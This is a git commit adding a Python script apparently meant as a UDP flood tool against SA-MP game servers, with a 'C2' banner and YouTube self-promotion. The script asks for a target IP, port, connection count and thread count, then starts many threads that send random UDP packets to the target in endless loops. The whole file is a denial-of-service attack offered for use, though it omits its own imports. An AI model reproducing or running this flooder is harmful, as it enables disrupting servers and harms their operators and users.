c13d1b94453c8481ae7760c3fdd385ac5eb38146
ZetZ04 <109226703+ZetZ04@users.noreply.github.com>
2022-07-14 16:29:53 +0700

    Add files via upload

---
+++ FRv191.py
@@ -0,0 +1,289 @@
+print("""
+\033[0;36m		                     Ryan\033[0;34mC2
+\033[0;36m                               TeamDevaloper\033[0;34mRyan		        
+\033[0;36m                               TeamForever\033[0;34mTools
+\033[0;36m                             Hosted By :\033[0;34m RyanFR
+""")
+print("""\033[96m\n
+                        \033[36m╔════════════════════════════════════╗
+                        \033[36m║ Team Forever Community             ║
+                        \033[36m║    Devaloper: Rayn \033[36m                ║
+                        \033[36m║       Support: RaynXFR \033[36m          ║
+                        \033[36m║         Tools Methods \033[36m             ║
+                        \033[36m║           Rayn Mode On  \033[36m           ║
+                        \033[36m║             TOOLS BY RAYN   \033[3      \033[36m         ║
+                        \033[36m╚════════════════════════════════════╝
+                        \033[96m\n""")
+
+print("TOOLS FOR UDP SA-MP SERVER")
+                                                                                 
+print("\033[36m                                   Subscribe Me Youtube RaynXFR")
+print("\033[36m╭─Rayn@RyanFR")
+ip = str(input("\033[96m└────  IP : "))
+port = int(input("\033[96m➣  PORT : "))
+choice = str(input("\033[96m➣  Pilih (y/n) : "))
+times = int(input("\033[96m➣  CONNECTIONS : "))
+threads = int(input("\033[96m➣  THREADS : "))
+
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("packet to Rayn ━━━━━> %s Port port:%s"%(ip,port))
+		except:
+			s.close()
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━> %s Port port:%s"%(ip,port))
+		except:
+			s.close()
+			
+def run3():
+	data = random._urandom(1024)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━> %s Port port:%s"%(ip,port))
+		except:
+			s.close()
+			
+def run4():
+	data = random._urandom(1024)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━> %s Port port:%s"%(ip,port))
+		except:
+			s.close()
+			
+def run5():
+	data = random._urandom(16)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━> %s Port port:%s"%(ip,port))
+		except:
+			s.close()
+
+def run6():
+	data = random._urandom(1024)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━>%s Port port:%s"%(ip,port))
+		except:
+			s.close()
+			
+def run7():
+	data = random._urandom(1024)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━>%s Port port:%s"%(ip,port))
+		except:
+			s.close()
+
+def run8():
+	data = random._urandom(16)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━>%s Port port:%s"%(ip,port))
+		except:
+			s.close()
+			
+def run9():
+	data = random._urandom(16)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━>%s Port port:%s"%(ip,port))
+		except:
+			s.close()
+			
+def run10():
+	data = random._urandom(16)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━>%s Port port:%s"%(ip,port))
+		except:
+			s.close()
+			
+def run11():
+	data = random._urandom(666)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━>%s Port port:%s"%(ip,port))
+		except:
+			s.close()
+			
+def run12():
+	data = random._urandom(666)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━>%s Port port:%s"%(ip,port))
+		except:
+			s.close()
+			
+def run13():
+	data = random._urandom(1024)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━>%s Port port:%s"%(ip,port))
+		except:
+			s.close()
+			
+def run14():
+	data = random._urandom(1024)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━>%s Port port:%s"%(ip,port))
+		except:
+			s.close()
+			
+def run15():
+	data = random._urandom(1024)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━>%s Port port:%s"%(ip,port))
+		except:
+			s.close()
+			
+def run16():
+	data = random._urandom(666)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━>%s Port port:%s"%(ip,port))
+		except:
+			s.close()
+			
+def run17():
+	data = random._urandom(761)
+	i = random.choice(("[+]","[-]","[+]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print("packet to Rayn ━━━━━>%s Port port:%s"%(ip,port))
+		except:
+			s.close()
+		
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run6)
+		th.start()
+		th = threading.Thread(target = run7)
+		th.start()
+		th = threading.Thread(target = run8)
+		th.start()
+		th = threading.Thread(target = run9)
+		th.start()
+		th = threading.Thread(target = run10)
+		th.start()
+		th = threading.Thread(target = run11)
+		th.start()
+		th = threading.Thread(target = run12)
+		th.start()
+		th = threading.Thread(target = run13)
+		th.start()
+		th = threading.Thread(target = run17)
+		th.start()
